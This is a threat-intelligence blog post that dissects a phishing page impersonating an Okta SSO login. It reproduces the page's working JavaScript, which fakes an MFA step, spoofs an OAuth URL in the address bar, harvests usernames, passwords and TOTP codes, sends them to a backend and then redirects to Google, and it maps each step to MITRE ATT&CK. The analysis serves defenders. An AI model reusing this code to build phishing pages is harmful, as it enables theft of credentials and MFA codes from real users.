Phishing…we all know what it is, but it remains one of the most effective [initial access vectors](https://kwm.me/posts/top-initial-access-vectors-2022/) that threat actors exploit. Unfortunately, the tricks become increasingly sophisticated that even [experienced professionals](https://cybernews.com/security/troy-hunt-falls-victim-to-phishing-attack/) can fall for them. I had previously covered a phishing campaign impersonating [EZPass](https://darkmoonsec.com/posts/Detecting-and-Decoding-EZPass-Phishing-Activity-in-the-Wild-Part-2/). I uncovered a variety of phishing pages and campaigns. However, an interesting artifact remained on these pages. There were comments in Chinese. I’m open to the possibility that they could be a false flag, but sometimes threat actors leave comments in their code. I even found comments in a Lumma Stealer payload that was encoded in [Base64](https://darkmoonsec.com/posts/How-Lumma-Infiltrates-Github-with-Roblox-Hacks/).

![](https://miro.medium.com/v2/resize:fit:700/1*71mBVcw5NGWmaABQbRtbDg.png)

Threat actors and penetration testers may use [templates](https://github.com/criggs626/PhishingTemplates) to streamline phishing deployments. But to maintain their stealth, they have to put their own flair behind it, as those templates have signatures that web browsers can detect.

Sure, a threat actor can throw their template into AI. There is even a business [model](https://www.linkedin.com/pulse/emerging-threat-shebyte-ai-powered-phaas-tammy-harper-5jndc) for phishing incorporating AI. However, there are threat actors that still like to create their own templates and view them as a piece of art. And that’s what I want to focus on. I found this phishing page from [@soursecc](https://x.com/soursecc). This page presents itself as an e-commerce platform.

![](https://miro.medium.com/v2/resize:fit:700/1*KsTfT_zbBAU44NMYlFurqw.png)

Okta is a popular platform that provides Multifactor Authentication (MFA) through Single Sign On (SSO) pages. Unfortunately, a threat actor can spoof legitimate Okta SSO pages and ensnare victims into a [trap](https://www.helpnetsecurity.com/2024/03/04/phishing-okta-sso/). I won’t provide the entire HTML page, but I will break down sections and highlight noteworthy comments left by our threat actor. At the end of each section of the code breakdown, I will provide MITRE ATT&CK alignment for TTPs observed.
## Authenticator Page function

```
function showAuthenticatorPage() {
            // Get the email from the username field
            const usernameInput = document.getElementById('username');
            const userEmail = usernameInput.value || 'user@example.com';

            // Update the email display in the authenticator page
            document.getElementById('user-email-display').textContent = userEmail;

            // Disable sign in button only
            const signInButton = document.querySelector('.sign-in-button');
            if (signInButton) {
                signInButton.disabled = true;
                signInButton.textContent = 'Signing in...';
            }

            // Wait 1.5 seconds before showing the MFA page
            setTimeout(function() {
                // Hide login form and show authenticator page
                document.getElementById('login-form-container').style.display = 'none';
                document.getElementById('authenticator-container').style.display = 'block';

                // Focus on the auth code input field
                setTimeout(function() {
                    document.getElementById('auth-code').focus();
                }, 100);
            }, 1500);
        }
```

This function simulates an MFA login by displaying the user's email, showing a "Signing In" animation, and transitioning to a fake Time-Based One-Time Password (TOTP) page. The comments even break down the deception. 

## Code Walkthrough & Analysis For Authenticator Page
```
// Get the email from the username field
const usernameInput = document.getElementById('username'); const userEmail = usernameInput.value  'user@example.com';`
```

The purpose of this section is to grab the email input and sets a fallback value ([user@example.com](mailto:user@example.com)) if empty. This ensures the user’s email continues to be visible to make the site more believable and simulate continuity between the login and MFA step.

```
// Update the email display in the authenticator page  
document.getElementById('user-email-display').textContent = userEmail;
```

This section reflects the user's email on the second page to establish trust and reinforce it.
```
   // Wait 1.5 seconds before showing the MFA page  
            setTimeout(function() {  
                // Hide login form and show authenticator page  
                document.getElementById('login-form-container').style.display = 'none';  
                document.getElementById('authenticator-container').style.display = 'block';  
  
                // Focus on the auth code input field  
                setTimeout(function() {  
                    document.getElementById('auth-code').focus();  
                }, 100);  
            }, 1500);  
        }
```


Delays the transition to mimic network/auth processing time, adding to the manipulation for the victim. Since there is nothing being processed, this would be instant without our threat actor. User Experience (UX) polish — auto-focuses the TOTP input to simulate real-time behavior, which prompts the victim to interact with the MFA input field.

| MITRE ID      | Technique                                      | Explanation                                                                                      |
| ------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **T1566.002** | **Phishing: Spearphishing Link**               | The entire login simulation is part of a phishing campaign to steal credentials and MFA tokens.  |
| **T1111**     | **Multi-Factor Authentication Interception**   | Fake authenticator page is used to trick users into entering TOTP codes from their MFA apps.     |
| **T1204.001** | **User Execution: Malicious Link**             | Victim must be lured to the page and interact with the login/MFA UI for the attack to succeed.   |
| **T1056.001** | **Input Capture: Keylogging/Form Capture**     | Though indirect, this technique captures sensitive user inputs without the user knowing.         |
| **T1556.004** | **Adversary-in-the-Middle (AiTM)** _(related)_ | This simulation is often paired with real-time proxy AiTM kits that use the same UI delay logic. |

## Login Form Function

```

function showLoginForm() {
            // Hide authenticator page and show login form
            document.getElementById('authenticator-container').style.display = 'none';
            document.getElementById('login-form-container').style.display = 'block';
        }

        // No password toggle functionality

        // Add event listener for Enter key in password field
        document.getElementById('password').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                showAuthenticatorPage();
            }
        });

        // Add event listener for Enter key in auth code field
        document.getElementById('auth-code').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                submitAuthData();
            }
        });

        // Focus on username field when page loads and update URL
        window.addEventListener('load', function() {
            document.getElementById('username').focus();

            // Update the URL to make it look like a legitimate SSO URL
            const samlUrl = '/oauth2/v1/authorize?client_id=SNIP';

            // Use history.replaceState to change the URL without causing a page reload
            history.replaceState(null, document.title, samlUrl);
        });
```

The purpose of this function is to add more believability to the MFA page with even more explicit instructions on deception, such as “Update the URL to make it look like a legitimate SSO URL.”

## Code Walkthrough & Analysis For Login Form

```
// Hide authenticator page and show login form
document.getElementById('authenticator-container').style.display = 'none';
document.getElementById('login-form-container').style.display = 'block';
}
```

Hides the fake MFA page and displays the login form again to maintain a smooth UI experience.

```
// Add event listener for Enter key in password field
document.getElementById('password').addEventListener('keypress', function(event) {
if (event.key === 'Enter') {
event.preventDefault();
showAuthenticatorPage();
}
});

```

This section directs the victim to a fake MFA page if the user enters their password and presses Enter. This callback references the Authenticator Page function mentioned earlier. It is here that our threat actor successfully captures the victim’s password.

```
// Add event listener for Enter key in auth code field
document.getElementById('auth-code').addEventListener('keypress', function(event) {
if (event.key === 'Enter') {
event.preventDefault();
submitAuthData();
}
});
```

Similar to the password field, this section of the page captures the TOTP token. The goal is to bypass MFA, and when the threat actor has this token, they have access to the victim's account.

```
// Focus on username field when page loads and update URL
window.addEventListener('load', function() {
document.getElementById('username').focus();

// Update the URL to make it look like a legitimate SSO URL
const samlUrl = '/oauth2/v1/authorize?client_id=SNIP';

// Use history.replaceState to change the URL without causing a page reload
history.replaceState(null, document.title, samlUrl);
});
```

This part of the function reinforces deception with additional tricks to appear legitimate. The web page will load the username input field on the next page of the authentication process through SSO. But another sneaky tactic this threat actor uses is rewriting the URL with a forged OAuth SAML URL. It never triggers a network request — just alters what the victim sees in the address bar.

| MITRE ID      | Technique                                         | Description                                                                                                       |
| ------------- | ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **T1566.002** | _Phishing: Spearphishing Link_                    | The code is part of a staged phishing page designed to mimic real identity providers.                             |
| **T1111**     | _Multi-Factor Authentication Interception_        | The fake MFA code input, coupled with `submitAuthData()`, supports full TOTP harvesting.                          |
| **T1056.001** | _Input Capture: Form Grabbing_                    | Simulated login + MFA code forms collect sensitive information entered by the user.                               |
| **T1204.001** | _User Execution: Malicious Link_                  | Victim must click a link and interact with fake input elements.                                                   |
| **T1556.004** | _Adversary-in-the-Middle (AiTM)_ _(Related)_      | While not a proxy attack, the visual deception achieves a similar outcome: session impersonation.                 |
| **T1036.005** | _Masquerading: Match Legitimate Name or Location_ | The history URL spoof creates a sense of legitimacy by copying real OAuth parameters.                             |
| **T1565.003** | _Data Manipulation: Transmitted Data_             | The attacker manipulates the URL in the victim’s browser to appear authentic without triggering network activity. |

## Submit Authentication Data Function

```
// Function to submit authentication data to the webhook handler
        function submitAuthData() {
            const username = document.getElementById('username').value || 'N/A';
            const password = document.getElementById('password').value || 'N/A';
            const mfaCode = document.getElementById('auth-code').value || 'N/A';

            // Prepare data for sending
            const data = {
                username: username,
                password: password,
                mfa_code: mfaCode
            };

            // Disable the verify button to prevent multiple submissions
            const verifyButton = document.querySelector('.verify-button');
            if (verifyButton) {
                verifyButton.disabled = true;
                verifyButton.textContent = 'Verifying';
                verifyButton.classList.add('loading');
            }

            // Send data to webhook handler via nginx proxy
            fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .catch((error) => {
                console.error('Error:', error);
            })
            .finally(() => {
                // Wait for 5 seconds before redirecting
                console.log('Redirecting in 5 seconds...');
                setTimeout(function() {
                    // Clear browser history to prevent back button
                    history.replaceState(null, '', '/');

                    // Redirect to Google
                    window.location.replace('https://accounts.google.com/');
                }, 5000);
            });
        }
```

This is the final function used by our threat actor. It exfiltrates captured credentials and MFA tokens to a webhook endpoint via a POST request, then redirects the user to a legitimate Google login page to mask the phishing operation. This webhook can be used with any endpoint; however, threat actors often utilize [Telegram](https://www.bitsight.com/blog/exfiltration-over-telegram-bots-skidding-infostealer-logs) or [Discord](https://www.bitsight.com/blog/exfiltration-over-telegram-bots-skidding-infostealer-logs) for this type of activity.

## Code Walkthrough & Analysis For Login Form

```
// Function to submit authentication data to the webhook handler
function submitAuthData() {
    const username = document.getElementById('username').value || 'N/A';
    const password = document.getElementById('password').value || 'N/A';
    const mfaCode = document.getElementById('auth-code').value || 'N/A';

// Prepare data for sending
    const data = {
            username: username,
            password: password,
            mfa_code: mfaCode
            };
```

The function begins with credential harvesting, which involves reading form fields. There is no client-side validation or encryption; instead, the data is extracted. The data is prepared in JSON format and sent to the threat actors' backend, which we identify as an NGINX Proxy (likely configured in reverse to hide their tracks).

```
// Send data to webhook handler via nginx proxy
    fetch('/api/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
                },
        body: JSON.stringify(data)
            })
            .then(response => response.json())
            .catch((error) => {
                console.error('Error:', error);
            })
```

Threat actors will use reverse proxies to hide their infrastructure. This tactic will obfuscate the true destination of the traffic. The reverse proxy manages the flow of traffic after it reaches it, and it is something that will not be shared with a network defender. All they can do is block that outgoing traffic when it is discovered. I found, through my Lumma Stealer research, that threat actors consider this and embed code with a secondary location ready to be activated in case of takedown. So even if you block that traffic, the threat actor is likely prepared for that.

```
    .finally(() => {
        // Wait for 5 seconds before redirecting
        console.log('Redirecting in 5 seconds...');
	        setTimeout(function() {
            // Clear browser history to prevent back button
                history.replaceState(null, '', '/');

            // Redirect to Google
                window.location.replace('https://accounts.google.com/');
                }, 5000);
            });
        }
```

Our threat actor ends their attack with .finally. They redirect traffic to Google and clear the browser history to prevent the victim from returning to the website after realizing what may have happened.

|MITRE ID|Technique|Description|
|---|---|---|
|**T1566.002**|_Phishing: Spearphishing via Link_|User is lured into a fake login + MFA page|
|**T1111**|_Multi-Factor Authentication Interception_|Captures TOTP codes directly from the fake MFA form|
|**T1056.001**|_Input Capture: Form Grabbing_|Harvests user input via DOM without alerting the user|
|**T1204.001**|_User Execution: Malicious Link_|User interaction is required to trigger the attack|
|**T1041**|_Exfiltration Over C2 Channel_|Uses `fetch()` to transmit credentials to a handler endpoint|
|**T1562.001**|_Impair Defenses: History Manipulation_|Uses `history.replaceState()` to hide back button trail (anti-forensics)|
|**T1556.004**|_Adversary-in-the-Middle (AiTM)_ (related)|Enables real-time session replay attacks if combined with proxy kits|

## Conclusion

Phishing websites may seem legitimate at first glance. However, upon closer inspection of the code, we can see that a threat actor might leave instructions there. AI may have generated these instructions, but I believe someone wrote those comments. Their oversight can provide valuable intelligence to analyze. A threat hunter can use these comments as a starting point to find additional phishing sites on search engines like FOFA and Shodan. From there, they can analyze HTTP headers, certificates, and other data sources to identify more malicious infrastructure. Sometimes, it can be difficult. I have seen cases where comments are removed and malicious code is hidden in JavaScript through obfuscation. Regardless, observing a threat actor revealing their playbook in the code offers a fascinating glimpse into malicious activities hidden in plain sight.
